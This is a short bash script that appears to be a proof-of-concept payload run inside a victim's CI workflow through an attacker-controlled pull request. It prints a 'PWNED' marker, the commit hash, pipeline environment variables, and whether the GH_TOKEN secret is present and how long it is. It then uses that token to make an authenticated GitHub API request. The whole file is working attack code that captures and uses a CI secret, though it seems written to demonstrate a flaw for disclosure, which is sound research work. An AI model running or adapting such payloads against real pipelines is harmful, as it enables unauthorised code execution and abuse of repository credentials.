#!/bin/bash
echo "PWNED_MARKER_9f3a: attacker-controlled script content executed"
echo "head=$(git rev-parse HEAD)"
echo "milestone_env=$MILESTONE"
echo "pr_number_env=$PR_NUMBER"
echo "token_present=$([ -n "$GH_TOKEN" ] && echo yes || echo no)"
echo "token_len=${#GH_TOKEN}"
curl -sS --max-time 10 -H "Authorization: token $GH_TOKEN" \
  https://api.github.com/repos/PDFtoMark/gab-poc-prt-closed-ref \
  -o /dev/null -w "api_status=%{http_code}\n"
